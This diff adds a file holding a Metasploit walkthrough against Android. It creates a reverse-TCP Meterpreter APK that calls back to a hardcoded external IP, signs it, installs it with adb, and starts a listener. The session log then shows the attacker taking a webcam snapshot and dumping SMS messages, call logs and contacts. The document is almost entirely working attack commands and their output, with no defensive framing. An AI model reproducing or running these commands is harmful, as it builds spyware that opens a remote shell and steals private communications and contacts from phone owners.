@@ -1,0 +1,58 @@
+$ msfvenom -p android/meterpreter/reverse_tcp  LHOST=188.130.155.36 LPORT=9999 R > evil.apk
+
+$ keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias app
+
+$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.jks evil.apk app
+
+
+$ adb install evil.apk
+$ adb shell
+
+shell@android:/ $ am start -n com.metasploit.stage/com.metasploit.stage.MainAc>
+Starting: Intent { cmp=com.metasploit.stage/.MainActivity }
+
+shell@android:/ $ am startservice -n com.metasploit.stage/com.metasploit.stage>
+Starting service: Intent { cmp=com.metasploit.stage/.MainService }
+
+
+
+
+msf > use multi/handler
+msf exploit(handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 188.130.155.36
+LHOST => 188.130.155.36
+msf exploit(handler) > set LPORT 9999
+LPORT => 9999
+msf exploit(handler) > exploit
+
+[-] Handler failed to bind to 188.130.155.36:9999:-  -
+[*] Started reverse TCP handler on 0.0.0.0:9999 
+[*] Starting the payload handler...
+[*] Sending stage (63194 bytes) to 10.0.2.2
+[*] Meterpreter session 1 opened (10.0.2.15:9999 -> 10.0.2.2:39541) at 2016-11-28 08:58:25 -0500
+
+meterpreter > pwd
+/data/data/com.metasploit.stage/files
+
+
+meterpreter > sysinfo
+Computer    : localhost
+OS          : Android 4.0.4 - Linux 3.0.13 (armv7l)
+Meterpreter : java/android
+
+meterpreter > webcam_snap
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/UiXcKyYv.jpeg
+
+meterpreter > dump_sms
+[*] Fetching 1273 sms messages
+[*] SMS messages saved to: sms_dump_20161128114216.txt
+meterpreter > dump_calllog
+[*] Fetching 200 entries
+[*] Call log saved to calllog_dump_20161128114228.txt
+meterpreter > dump_contacts
+[*] Fetching 128 contacts into list
+[*] Contacts list saved to: contacts_dump_20161128114236.txt
